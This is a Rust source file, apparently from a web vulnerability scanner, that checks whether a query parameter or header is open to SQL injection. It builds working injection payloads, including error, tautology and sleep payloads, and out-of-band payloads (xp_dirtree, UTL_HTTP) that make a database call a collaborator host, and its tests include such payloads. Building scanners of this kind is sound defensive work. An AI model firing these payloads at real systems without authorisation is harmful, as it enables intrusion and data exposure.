//! `input.sqli` — whether an input reaches a SQL query unsanitised.
//!
//! The claim a scanner most wants to make and most often cannot back. "A single quote
//! produced an error" is suggestive, not proof: the error could be a coincidence of that
//! one request, and a boolean payload that changes a page could be changing it for a
//! dozen reasons. So this settles the two questions that separate SQL injection from a
//! flaky endpoint, and never reports on one request alone:
//!
//! ```text
//! error-based:   value'   → a database error surfaces
//!                value''  → the doubled quote balances, and the error does not.
//!                The error follows the quote, not the request. That is the tell.
//!
//! boolean-based: value' AND '1'='1   → answers like the original
//!                value' AND '1'='2   → answers differently
//!                The input is being concatenated into a condition the server evaluates.
//!
//! time-based:    value' AND SLEEP(2)   → the response takes ~2s longer
//!                value' AND SLEEP(4)   → ~4s longer, so the wait tracks the number asked.
//!                The blind case: nothing of the result shows, but the server waits.
//!
//! out-of-band:   value';EXEC master..xp_dirtree '\\<token>.collab\a'  → a DNS/SMB callback
//!                The last resort: the query cannot be seen or timed, but the database can
//!                be made to reach a collaborator, and the callback proves the input ran.
//! ```
//!
//! The time-based test is the one for a query whose result never reaches the response —
//! no error, no content that tracks a condition. The only thing left to control is how
//! long the server takes, and a delay that scales from `D` to `2D` on command is not
//! network noise. Fast baseline samples keep a naturally slow endpoint from reading as a
//! sleep, and it runs last because it is the slowest — each confirming probe waits out
//! its own delay. Nothing here writes: `SLEEP`/`pg_sleep`/`WAITFOR DELAY` only wait.
//!
//! # It says "SQL injection", carefully
//!
//! Only when an experiment reproduces. A single database error is reported as a lead
//! (`Supported`), because an application can emit one for reasons that are not
//! injectable. The differential — an error that appears with an unbalanced quote and
//! vanishes with a balanced one, or a page that tracks the truth of an injected
//! condition — is what earns `Reproduced`.
//!
//! # Which inputs, and how safely
//!
//! The same query parameters and ordinary headers [`nullhawk_types::inject::inputs`]
//! offers the reflection check, and only on replay-safe methods, which the scheduler
//! enforces. Every payload passes through [`substitute`], which blocks CR/LF/NUL, so a
//! probe cannot smuggle a second request. Nothing here writes: the payloads read, or
//! error, and boolean tests assert tautologies, never `DROP` or `UPDATE`.

use async_trait::async_trait;
use nullhawk_types::finding::{
    Evidence, FindingSource, Hypothesis, Location, MessagePart, Severity,
};
use nullhawk_types::ids::InteractionId;
use nullhawk_types::inject::{inputs, inputs_in, substitute, value_at};
use nullhawk_types::object::ObjectLocation;
use nullhawk_types::verify::{
    DetectorId, DetectorInfo, DetectorMode, Support, Verification, Writeup,
};
use nullhawk_types::Result;
use nullhawk_verify::{Canary, Lab};
use std::time::{Duration, Instant};

use crate::{ActiveCheck, Budget, Subject};

/// The shorter of the two injected delays, in seconds; the confirming probe asks for
/// twice this. Two seconds is well clear of ordinary jitter and keeps the run's added
/// wall-clock modest — a confirmed hit costs one D-second wait and one 2D-second wait.
const DELAY_SECS: u64 = 2;

/// Fast control samples taken before the sleep probes, so a naturally slow endpoint is
/// told from an injected delay rather than mistaken for one.
const BASELINE_SAMPLES: usize = 3;

/// How long to wait for an out-of-band callback, and how often to check. A database that
/// reaches out does so on its own schedule, so the token is polled a handful of times.
const CALLBACK_POLLS: usize = 6;
const CALLBACK_INTERVAL: Duration = Duration::from_millis(750);

/// The check.
pub struct SqlInjection;

/// The hypothesis this check exists to answer.
const SETTLES: &str = "input.sqli";

const INFO: DetectorInfo = DetectorInfo {
    id: DetectorId("input.sqli"),
    name: "SQL injection",
    version: "1.2.0",
    about: "whether an input is concatenated into a SQL query — by the error an \
            unbalanced quote raises, or a boolean condition the response tracks",
    mode: DetectorMode::Active,
    observes: false,
    hypothesizes: false,
    settles: Some(SETTLES),
};

/// Database error signatures, paired with the engine they name. Substrings rather than
/// regexes: they are distinctive enough that a match is the point, and a list is easier
/// to read and to extend than a pattern.
const SIGNATURES: &[(&str, &str)] = &[
    ("You have an error in your SQL syntax", "MySQL"),
    ("check the manual that corresponds to your MySQL", "MySQL"),
    ("MySqlException", "MySQL"),
    ("valid MySQL result", "MySQL"),
    ("MariaDB server version", "MariaDB"),
    ("PostgreSQL query failed", "PostgreSQL"),
    ("pg_query()", "PostgreSQL"),
    ("PSQLException", "PostgreSQL"),
    ("syntax error at or near", "PostgreSQL"),
    (
        "Unclosed quotation mark after the character string",
        "SQL Server",
    ),
    ("Incorrect syntax near", "SQL Server"),
    ("System.Data.SqlClient.SqlException", "SQL Server"),
    ("Microsoft OLE DB Provider for SQL Server", "SQL Server"),
    ("ORA-00933", "Oracle"),
    ("ORA-01756", "Oracle"),
    ("quoted string not properly terminated", "Oracle"),
    ("SQLITE_ERROR", "SQLite"),
    ("sqlite3.OperationalError", "SQLite"),
    ("unrecognized token:", "SQLite"),
    ("SQLSTATE", "SQL"),
];

#[async_trait]
impl ActiveCheck for SqlInjection {
    fn about(&self) -> DetectorInfo {
        INFO
    }

    fn handles(&self, hypothesis: &Hypothesis) -> bool {
        hypothesis.detector == SETTLES
    }

    async fn settle(
        &self,
        subject: &Subject,
        lab: &dyn Lab,
        budget: &Budget,
    ) -> Result<Verification> {
        let Some(slot) = slot_named(subject) else {
            return Ok(Verification::Inconclusive {
                why: format!(
                    "the input this was raised about is no longer in {} {}, so there was \
                     nothing to inject into",
                    subject.exchange.method, subject.exchange.url
                ),
            });
        };
        let base = value_at(&subject.draft.request, &slot).unwrap_or_default();

        // A control against which every probe is read. The application can be dynamic,
        // so the captured exchange is not enough: a fresh baseline is what a boolean
        // divergence is measured from.
        let baseline = match probe(subject, lab, &slot, &base).await {
            Attempt::Answered(a) => a,
            Attempt::Failed(why) => return Ok(Verification::Inconclusive { why }),
        };

        // ---- error-based ----
        if budget.per_hypothesis >= 2 {
            let quoted = match probe(subject, lab, &slot, &format!("{base}'")).await {
                Attempt::Answered(a) => a,
                Attempt::Failed(why) => return Ok(Verification::Inconclusive { why }),
            };
            if let Some(hit) = first_signature(&quoted.body) {
                // Confirm the quote is the cause: a doubled quote balances the string, and
                // a genuine SQL error follows the syntax, not the request.
                if budget.per_hypothesis >= 3 {
                    if let Attempt::Answered(balanced) =
                        probe(subject, lab, &slot, &format!("{base}''")).await
                    {
                        if first_signature(&balanced.body).is_none() {
                            return Ok(Verification::Reproduced {
                                note: format!(
                                    "an unbalanced quote in {} raised a {} error, and a \
                                     balanced pair of quotes did not — the error follows \
                                     the SQL syntax the input broke",
                                    describe(&slot),
                                    hit.engine,
                                ),
                                evidence: vec![
                                    from_exchange(subject),
                                    excerpt_of(&quoted, &hit),
                                    Evidence::Comparison {
                                        baseline: balanced.request,
                                        variant: quoted.request,
                                        difference: format!(
                                            "a single quote produced a {} error; a doubled \
                                             quote did not",
                                            hit.engine
                                        ),
                                    },
                                ],
                            });
                        }
                    }
                }
                return Ok(Verification::Supported {
                    support: Support::Distinctive,
                    note: format!(
                        "an unbalanced quote in {} produced a {} database error",
                        describe(&slot),
                        hit.engine
                    ),
                    evidence: vec![from_exchange(subject), excerpt_of(&quoted, &hit)],
                });
            }
        }

        // ---- boolean-based ----
        if budget.per_hypothesis >= 4 {
            let truthy = probe(subject, lab, &slot, &format!("{base}' AND '1'='1")).await;
            let falsy = probe(subject, lab, &slot, &format!("{base}' AND '1'='2")).await;
            if let (Attempt::Answered(t), Attempt::Answered(f)) = (truthy, falsy) {
                // Injection tracks the condition: the true payload answers like the
                // untouched request, the false payload does not, and the two payloads
                // differ from each other. A page that ignores the input fails all three.
                if similar(&t, &baseline) && !similar(&f, &baseline) && !similar(&t, &f) {
                    return Ok(Verification::Reproduced {
                        note: format!(
                            "in {}, a payload asserting a true condition answered like the \
                             original request ({}), and one asserting a false condition did \
                             not ({}) — the response tracks a SQL condition the input controls",
                            describe(&slot),
                            summarise(&t),
                            summarise(&f),
                        ),
                        evidence: vec![
                            from_exchange(subject),
                            Evidence::Comparison {
                                baseline: t.request,
                                variant: f.request,
                                difference: format!(
                                    "the true-condition payload answered {} and the \
                                     false-condition payload answered {}",
                                    summarise(&t),
                                    summarise(&f),
                                ),
                            },
                        ],
                    });
                }
            }
        }

        // ---- time-based blind ----
        //
        // The case neither error nor boolean catches: the query runs, the input reaches
        // it, but nothing about the result — error, row count, content — shows in the
        // response. The only thing left to control is *how long the server takes*. Inject
        // a sleep, and if the response slows, confirm the delay tracks the number asked
        // for — a coincidentally slow request does not scale from D to 2D on command.
        //
        // Last because it is the slowest: each confirming probe waits out its own delay.
        if budget.per_hypothesis >= 4 {
            if let Some(verdict) = time_based(subject, lab, &slot, &base, budget).await {
                return Ok(verdict);
            }
        }

        // ---- out-of-band blind ----
        //
        // The last resort, for a sink that neither reflects a result nor can be timed —
        // a database whose sleep is disabled or filtered, or a query whose delay is lost
        // in a queue. Some engines can be made to reach out: MSSQL walks a UNC path,
        // Oracle resolves a host or fetches a URL. Point one at the collaborator and a
        // callback bearing the planted token proves the input reached the query. Only when
        // the run has a collaborator; without one this stays the honest refuted below.
        if let Some(canary) = lab.canary() {
            if let Some(verdict) = out_of_band(subject, lab, &slot, &base, canary, budget).await {
                return Ok(verdict);
            }
        }

        Ok(Verification::Refuted {
            note: format!(
                "no database error surfaced from an unbalanced quote in {}, boolean \
                 payloads did not change the response, a sleep payload did not delay it, \
                 and no out-of-band callback arrived — this input shows no sign of \
                 reaching a SQL query unsanitised",
                describe(&slot),
            ),
        })
    }

    fn writeup(&self, subject: &Subject, verification: &Verification) -> Writeup {
        let slot = slot_named(subject);
        let where_ = slot
            .as_ref()
            .map(describe)
            .unwrap_or_else(|| "an input".into());

        Writeup {
            target: subject.target,
            title: format!(
                "SQL injection in {} of {} {}",
                where_,
                subject.exchange.method,
                path_of(&subject.exchange.url),
            ),
            description: format!(
                "A value placed in {where_} of {} {} reaches a SQL query without being \
                 parameterised. {}\n\nThe experiment is described in the evidence and \
                 recompiles from it: no part of this rests on a single suggestive response.",
                subject.exchange.method,
                subject.exchange.url,
                sentence(verification.note()),
            ),
            impact: "An input that reaches a SQL query unparameterised lets a caller alter \
                     the query: to read rows the query never meant to return, to bypass a \
                     WHERE that guards a login, and — depending on the database and its \
                     privileges — to write data or reach the host. The database decides how \
                     far it goes; the injection is what opens the door."
                .into(),
            remediation: "Use parameterised queries (prepared statements) so the input is \
                          bound as a value and never parsed as SQL. Escaping and blocklists \
                          are defeated by encodings and dialects; parameters are the reliable \
                          fix. An ORM's raw-query escape hatch needs the same care."
                .into(),
            reproduction: format!(
                "Send {} {} with {where_} carrying the payloads the evidence records, and \
                 compare the responses. `nullhawk poc <project> <finding>` compiles the exact \
                 requests.",
                subject.exchange.method, subject.exchange.url,
            ),
            cwe: Some("CWE-89".into()),
            owasp: Some("A03:2021 Injection".into()),
            source: FindingSource::ActiveScan {
                detector: INFO.id.to_string(),
                version: INFO.version.to_string(),
            },
            severity: severity_for(verification),
            location: slot
                .as_ref()
                .map(|slot| Location {
                    part: part_of(slot),
                    name: name_of(slot),
                })
                .or(subject.hypothesis.location.clone()),
        }
    }
}

/// Severity, from what the experiment established. A reproduced injection is High; a lone
/// database error is a Medium lead; nothing else files a finding.
fn severity_for(verification: &Verification) -> Severity {
    match verification {
        Verification::Reproduced { .. } => Severity::High,
        Verification::Supported {
            support: Support::Distinctive,
            ..
        } => Severity::Medium,
        _ => Severity::Low,
    }
}

/// One probe and what came back.
struct Answer {
    request: nullhawk_types::ids::RequestId,
    status: u16,
    body: Vec<u8>,
}

enum Attempt {
    Answered(Answer),
    Failed(String),
}

async fn probe(subject: &Subject, lab: &dyn Lab, slot: &ObjectLocation, value: &str) -> Attempt {
    let mut draft = subject.draft.clone();
    draft.request = match substitute(&draft.request, slot, value) {
        Ok(request) => request,
        Err(e) => return Attempt::Failed(format!("the payload could not be placed: {e}")),
    };
    let sent = match lab.experiment(&draft, None).await {
        Ok(sent) => sent,
        Err(e) => return Attempt::Failed(e.to_string()),
    };
    let response = &sent.exchange.response;
    Attempt::Answered(Answer {
        request: sent.id,
        status: response.status,
        body: response.body.to_vec(),
    })
}

/// Sends a probe and measures its round-trip time. The wall clock is taken around the
/// send here, rather than read from the exchange, so what is measured is exactly what a
/// time-based test cares about: how long the server held the request.
async fn timed(
    subject: &Subject,
    lab: &dyn Lab,
    slot: &ObjectLocation,
    value: &str,
) -> Option<(Answer, u64)> {
    let mut draft = subject.draft.clone();
    draft.request = substitute(&draft.request, slot, value).ok()?;
    let started = Instant::now();
    let sent = lab.experiment(&draft, None).await.ok()?;
    let elapsed_ms = started.elapsed().as_millis() as u64;
    let response = &sent.exchange.response;
    Some((
        Answer {
            request: sent.id,
            status: response.status,
            body: response.body.to_vec(),
        },
        elapsed_ms,
    ))
}

/// Sleep payloads by engine, at `secs` seconds. Both quoted string and bare numeric
/// contexts, because the injection point is one or the other and the cost of trying the
/// wrong one is a single fast request — a payload that does not parse, or parses in
/// another engine's dialect, simply does not sleep.
fn sleep_payloads(base: &str, secs: u64) -> Vec<(&'static str, String)> {
    vec![
        ("MySQL", format!("{base}' AND SLEEP({secs})-- -")),
        ("MySQL", format!("{base}\" AND SLEEP({secs})-- -")),
        ("MySQL", format!("{base} AND SLEEP({secs})")),
        ("PostgreSQL", format!("{base}';SELECT pg_sleep({secs})-- -")),
        (
            "PostgreSQL",
            format!("{base}' AND {secs}=(SELECT {secs} FROM PG_SLEEP({secs}))-- -"),
        ),
        (
            "Microsoft SQL Server",
            format!("{base}';WAITFOR DELAY '0:0:{secs}'-- -"),
        ),
        (
            "Microsoft SQL Server",
            format!("{base}' WAITFOR DELAY '0:0:{secs}'-- -"),
        ),
    ]
}

/// Whether a probe cleared the baseline by most of the delay it asked for — the bar a
/// response has to pass to count as having slept at all. 0.6·D of slack absorbs jitter.
fn slept(baseline_max: u64, t: u64, d_ms: u64) -> bool {
    t >= baseline_max + (d_ms * 6) / 10
}

/// Whether the 2D probe added most of another D on top of the D probe — the tracking
/// that separates an injected sleep from one request that happened to be slow.
fn scales(t_short: u64, t_long: u64, d_ms: u64) -> bool {
    t_long >= t_short + (d_ms * 5) / 10
}

/// The time-based blind experiment. Returns a verdict only when a sleep delayed the
/// response *and* doubling the requested delay roughly doubled the wait — `None`
/// otherwise, so the caller reports the honest refuted.
async fn time_based(
    subject: &Subject,
    lab: &dyn Lab,
    slot: &ObjectLocation,
    base: &str,
    budget: &Budget,
) -> Option<Verification> {
    // What an undisturbed request costs, sampled a few times. The slowest sample is the
    // bar a delay has to clear, so ordinary variance is not read as a sleep.
    let mut baseline_ms = Vec::new();
    for _ in 0..BASELINE_SAMPLES {
        if let Some((_, ms)) = timed(subject, lab, slot, base).await {
            baseline_ms.push(ms);
        }
    }
    let baseline_max = *baseline_ms.iter().max()?;
    let d_ms = DELAY_SECS * 1000;

    let short = sleep_payloads(base, DELAY_SECS);
    let long = sleep_payloads(base, DELAY_SECS * 2);
    let mut spent = 0usize;
    for ((engine, pshort), (_, plong)) in short.iter().zip(long.iter()) {
        // Each candidate costs at most two probes; stop before one the budget cannot pay
        // for, counting generously since the slow probes are the expensive ones.
        if spent + 2
            > budget
                .per_hypothesis
                .saturating_sub(BASELINE_SAMPLES)
                .max(2)
        {
            break;
        }
        let Some((_, t_short)) = timed(subject, lab, slot, pshort).await else {
            continue;
        };
        spent += 1;
        if !slept(baseline_max, t_short, d_ms) {
            continue; // this dialect did not sleep — try the next
        }
        // Promising. Confirm the wait scales with the number asked for.
        let Some((confirmed, t_long)) = timed(subject, lab, slot, plong).await else {
            continue;
        };
        spent += 1;
        if scales(t_short, t_long, d_ms) {
            return Some(Verification::Reproduced {
                note: format!(
                    "{} delayed the response by about {} second(s) when told to sleep for \
                     {DELAY_SECS}, and about twice that when told to sleep for {} — the \
                     server waits for a {} sleep the input controls, though nothing of the \
                     query's result reaches the response. This is a blind, time-based SQL \
                     injection",
                    describe(slot),
                    (t_short.saturating_sub(baseline_max)) / 1000,
                    DELAY_SECS * 2,
                    engine,
                ),
                evidence: vec![
                    from_exchange(subject),
                    Evidence::Timing {
                        request: confirmed.request,
                        baseline_ms: baseline_ms.clone(),
                        variant_ms: vec![t_short, t_long],
                    },
                ],
            });
        }
    }
    None
}

/// OOB payloads by engine, at a canary host `h` (token-bearing in subdomain mode) and a
/// canary URL `u`. The engines that can be made to reach out: MSSQL walks a UNC path
/// (a DNS lookup of the host), Oracle resolves a host or fetches a URL. Each is sent with
/// its own minted canary so a callback names the engine that made it.
fn oob_payloads(base: &str, h: &str, u: &str) -> Vec<(&'static str, String)> {
    vec![
        (
            "Microsoft SQL Server",
            format!("{base}';EXEC master..xp_dirtree '\\\\{h}\\a';-- -"),
        ),
        (
            "Oracle",
            format!("{base}' AND UTL_INADDR.GET_HOST_ADDRESS('{h}') IS NOT NULL-- -"),
        ),
        (
            "Oracle",
            format!("{base}' AND UTL_HTTP.REQUEST('{u}') IS NOT NULL-- -"),
        ),
    ]
}

/// The host of a URL, without scheme, port or path — for a UNC or host-resolution payload.
/// In a subdomain-mode canary this label carries the token.
fn host_of(url: &str) -> String {
    let after = url.split_once("://").map(|(_, r)| r).unwrap_or(url);
    let hostport = after.split(['/', '?']).next().unwrap_or(after);
    hostport.split(':').next().unwrap_or(hostport).to_string()
}

/// The out-of-band experiment. Sends one payload per engine, each carrying its own canary,
/// then polls for a callback. A hit proves the input reached a query even though nothing
/// of the result — content, timing — came back. `None` when nothing could be sent or
/// nothing called back in the window, which the caller turns into the honest refuted.
async fn out_of_band(
    subject: &Subject,
    lab: &dyn Lab,
    slot: &ObjectLocation,
    base: &str,
    first: Canary,
    budget: &Budget,
) -> Option<Verification> {
    // Each payload carries its own minted canary, so a callback names the engine that
    // made it. Indexed rather than keyed by engine name — two of the templates are Oracle,
    // and matching by name would send one of them twice and the other never.
    let mut sent: Vec<(&'static str, String, nullhawk_types::ids::RequestId)> = Vec::new();
    let mut spent = 0usize;
    let count = oob_payloads(base, "", "").len();

    for i in 0..count {
        if spent >= budget.per_hypothesis.max(1) {
            break;
        }
        let canary = if i == 0 {
            first.clone()
        } else {
            match lab.canary() {
                Some(canary) => canary,
                None => break,
            }
        };
        let built = oob_payloads(base, &host_of(&canary.url), &canary.url);
        let (engine, payload) = &built[i];
        if let Attempt::Answered(answer) = probe(subject, lab, slot, payload).await {
            sent.push((engine, canary.token.clone(), answer.request));
            spent += 1;
        }
    }
    if sent.is_empty() {
        return None;
    }

    for _ in 0..CALLBACK_POLLS {
        tokio::time::sleep(CALLBACK_INTERVAL).await;
        for (engine, token, request) in &sent {
            let Ok(interactions) = lab.interactions(token).await else {
                continue;
            };
            if let Some(hit) = interactions.into_iter().next() {
                return Some(Verification::Reproduced {
                    note: format!(
                        "{} reached a SQL query: an {engine} out-of-band payload caused a \
                         {} interaction to the collaborator from {}, carrying the token \
                         planted only in that request. Nothing of the query's result came \
                         back — this is a blind, out-of-band SQL injection",
                        describe(slot),
                        hit.protocol,
                        hit.source,
                    ),
                    evidence: vec![
                        from_exchange(subject),
                        Evidence::OutOfBand {
                            request: *request,
                            interaction: InteractionId::new(),
                            protocol: hit.protocol,
                        },
                    ],
                });
            }
        }
    }
    None
}

struct Signature {
    engine: &'static str,
    offset: usize,
    excerpt: String,
}

/// The first database error signature in a body, with a short excerpt around it.
fn first_signature(body: &[u8]) -> Option<Signature> {
    let text = String::from_utf8_lossy(body);
    let mut best: Option<Signature> = None;
    for (needle, engine) in SIGNATURES {
        if let Some(at) = text.find(needle) {
            if best.as_ref().is_none_or(|b| at < b.offset) {
                let start = at.saturating_sub(24);
                let end = (at + needle.len() + 40).min(text.len());
                // `get` rather than indexing: a byte range that lands mid-character in a
                // UTF-8 body would panic, and the body is attacker-influenced.
                let window = text.get(start..end).unwrap_or(needle);
                best = Some(Signature {
                    engine,
                    offset: at,
                    excerpt: window.replace(['\n', '\r'], " ").trim().to_string(),
                });
            }
        }
    }
    best
}

fn excerpt_of(answer: &Answer, hit: &Signature) -> Evidence {
    Evidence::Exchange {
        request: answer.request,
        response: None,
        note: format!(
            "answered {}, and the body carried a {} error at byte {}: `{}`",
            answer.status, hit.engine, hit.offset, hit.excerpt,
        ),
    }
}

fn from_exchange(subject: &Subject) -> Evidence {
    Evidence::Exchange {
        request: subject.exchange.id,
        response: None,
        note: format!(
            "the captured exchange this was raised from: {} {}",
            subject.exchange.method, subject.exchange.url
        ),
    }
}

/// Whether two answers are alike enough to be "the same page": same status, and body
/// lengths within a small tolerance. Length rather than bytes because a dynamic page
/// varies a little between identical requests; a boolean divergence is far larger.
fn similar(a: &Answer, b: &Answer) -> bool {
    if a.status != b.status {
        return false;
    }
    let (la, lb) = (a.body.len(), b.body.len());
    let tolerance = (la.max(lb) / 50).max(24);
    la.abs_diff(lb) <= tolerance
}

fn summarise(a: &Answer) -> String {
    format!("{} with {} bytes", a.status, a.body.len())
}

/// The input the hypothesis was raised about, if the request still has it.
fn slot_named(subject: &Subject) -> Option<ObjectLocation> {
    let wanted = subject.hypothesis.location.as_ref()?;
    inputs(&subject.draft.request).into_iter().find(|slot| {
        name_of(slot).eq_ignore_ascii_case(&wanted.name) && part_of(slot) == wanted.part
    })
}

fn describe(slot: &ObjectLocation) -> String {
    match slot {
        ObjectLocation::Query { name, .. } => format!("the `{name}` query parameter"),
        ObjectLocation::Header { name, .. } => format!("the `{name}` header"),
        other => format!("{other:?}"),
    }
}

fn name_of(slot: &ObjectLocation) -> String {
    match slot {
        ObjectLocation::Query { name, .. } | ObjectLocation::Header { name, .. } => name.clone(),
        other => format!("{other:?}"),
    }
}

fn part_of(slot: &ObjectLocation) -> MessagePart {
    match slot {
        ObjectLocation::Query { .. } => MessagePart::Query,
        ObjectLocation::Header { .. } => MessagePart::Header,
        _ => MessagePart::Body,
    }
}

fn sentence(note: &str) -> String {
    let mut chars = note.chars();
    match chars.next() {
        Some(first) => first.to_uppercase().collect::<String>() + chars.as_str(),
        None => String::new(),
    }
}

fn path_of(url: &str) -> &str {
    url.split_once("://")
        .and_then(|(_, rest)| rest.find('/').map(|at| &rest[at..]))
        .unwrap_or("/")
}

/// Raises one suspicion per input of a captured request — a work item, at `Info`, not a
/// claim. See [`super::echo::suspect`] for why this lives here rather than in a passive
/// check.
pub fn suspect(exchange: &nullhawk_scan::Exchange) -> Vec<Hypothesis> {
    inputs_in(&exchange.path, &exchange.request_headers)
        .into_iter()
        .map(|slot| Hypothesis {
            detector: SETTLES.to_string(),
            claim: format!(
                "{} {} — {}",
                exchange.method,
                path_of(&exchange.url),
                describe(&slot),
            ),
            source_request: exchange.id,
            location: Some(Location {
                part: part_of(&slot),
                name: name_of(&slot),
            }),
            provisional_severity: Severity::Info,
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn raised(detector: &str) -> Hypothesis {
        Hypothesis {
            detector: detector.into(),
            claim: "something".into(),
            source_request: nullhawk_types::ids::RequestId::new(),
            location: None,
            provisional_severity: Severity::Info,
        }
    }

    fn exchange(target: &str) -> nullhawk_scan::Exchange {
        nullhawk_scan::Exchange {
            id: nullhawk_types::ids::RequestId::new(),
            target: nullhawk_types::ids::TargetId::new(),
            host: "api.example.com".into(),
            port: 443,
            secure: true,
            method: "GET".into(),
            url: format!("https://api.example.com{target}"),
            path: target.into(),
            status: 200,
            request_headers: nullhawk_types::http::Headers::new(),
            response_headers: nullhawk_types::http::Headers::new(),
            response_bytes: 0,
            authenticated: false,
            tls: None,
            sent_at: "2026-09-11T00:00:00Z".into(),
            origin: "proxy".into(),
        }
    }

    #[test]
    fn it_settles_its_own_suspicions_and_no_others() {
        assert!(SqlInjection.handles(&raised(SETTLES)));
        assert!(!SqlInjection.handles(&raised("input.reflected")));
        assert!(!SqlInjection.handles(&raised("authz.cross_identity")));
    }

    #[test]
    fn it_reports_itself_as_active_and_as_a_settler() {
        let info = SqlInjection.about();
        assert_eq!(info.mode, DetectorMode::Active);
        assert!(info.sends());
        assert_eq!(info.settles, Some(SETTLES));
    }

    #[test]
    fn a_raised_suspicion_claims_nothing_about_the_application() {
        let raised = suspect(&exchange("/products?id=1&sort=name"));
        assert_eq!(raised.len(), 2, "{raised:#?}");
        for hypothesis in &raised {
            assert_eq!(hypothesis.provisional_severity, Severity::Info);
            assert_eq!(hypothesis.detector, SETTLES);
        }
        assert!(raised[0].claim.contains("`id`"), "{}", raised[0].claim);
    }

    #[test]
    fn error_signatures_are_found_and_excerpted() {
        let body = b"<html><body>Warning: You have an error in your SQL syntax near ''' at line 1</body></html>";
        let hit = first_signature(body).expect("signature present");
        assert_eq!(hit.engine, "MySQL");
        assert!(hit.excerpt.contains("SQL syntax"), "{}", hit.excerpt);
        assert!(first_signature(b"a perfectly ordinary page").is_none());
    }

    #[test]
    fn severity_follows_what_the_experiment_showed() {
        assert_eq!(
            severity_for(&Verification::Reproduced {
                note: String::new(),
                evidence: Vec::new()
            }),
            Severity::High
        );
        assert_eq!(
            severity_for(&Verification::Supported {
                support: Support::Distinctive,
                note: String::new(),
                evidence: Vec::new()
            }),
            Severity::Medium
        );
    }

    #[test]
    fn similarity_tracks_status_and_length() {
        let mk = |status: u16, len: usize| Answer {
            request: nullhawk_types::ids::RequestId::new(),
            status,
            body: vec![b'x'; len],
        };
        assert!(similar(&mk(200, 1000), &mk(200, 1010)));
        assert!(!similar(&mk(200, 1000), &mk(200, 4000)));
        assert!(!similar(&mk(200, 1000), &mk(500, 1000)));
    }

    #[test]
    fn a_sleep_must_clear_the_baseline_by_most_of_the_delay() {
        let d = DELAY_SECS * 1000; // 2000ms
                                   // baseline 80ms; a 2s sleep lands near 2080ms — well clear.
        assert!(slept(80, 2100, d));
        // A request 300ms over baseline is jitter, not a 2s sleep.
        assert!(!slept(80, 380, d));
        // A slow endpoint (baseline 1900ms) is not itself a sleep.
        assert!(!slept(1900, 2000, d));
    }

    #[test]
    fn a_confirmed_injection_scales_from_d_to_two_d() {
        let d = DELAY_SECS * 1000;
        // D≈2.1s, 2D≈4.1s: the long probe added ~2s more, so it tracks.
        assert!(scales(2100, 4100, d));
        // A one-off slow D probe that does not grow at 2D is not an injection.
        assert!(!scales(2100, 2200, d));
    }

    #[test]
    fn the_oob_payloads_reach_out_through_the_canary_host_and_url() {
        let ps = oob_payloads("x", "tok.collab.example", "http://tok.collab.example/p");
        let joined = ps
            .iter()
            .map(|(_, p)| p.as_str())
            .collect::<Vec<_>>()
            .join("\n");
        // MSSQL walks a UNC path to the canary host (a DNS lookup).
        assert!(
            joined.contains(r"xp_dirtree '\\tok.collab.example\a'"),
            "{joined}"
        );
        // Oracle resolves the host, and fetches the URL.
        assert!(joined.contains("UTL_INADDR.GET_HOST_ADDRESS('tok.collab.example')"));
        assert!(joined.contains("UTL_HTTP.REQUEST('http://tok.collab.example/p')"));
    }

    #[test]
    fn the_canary_host_is_stripped_to_a_bare_label() {
        assert_eq!(host_of("http://tok.collab.example/p"), "tok.collab.example");
        assert_eq!(host_of("http://127.0.0.1:8888/tok"), "127.0.0.1");
    }

    #[test]
    fn the_sleep_payloads_cover_the_major_engines_and_both_contexts() {
        let ps = sleep_payloads("x", 2);
        let joined = ps
            .iter()
            .map(|(_, p)| p.as_str())
            .collect::<Vec<_>>()
            .join("\n");
        assert!(joined.contains("SLEEP(2)"), "MySQL");
        assert!(
            joined.contains("pg_sleep(2)") || joined.contains("PG_SLEEP(2)"),
            "Postgres"
        );
        assert!(joined.contains("WAITFOR DELAY '0:0:2'"), "MSSQL");
        // A bare numeric context, not only quoted ones.
        assert!(ps.iter().any(|(_, p)| p == "x AND SLEEP(2)"));
    }
}
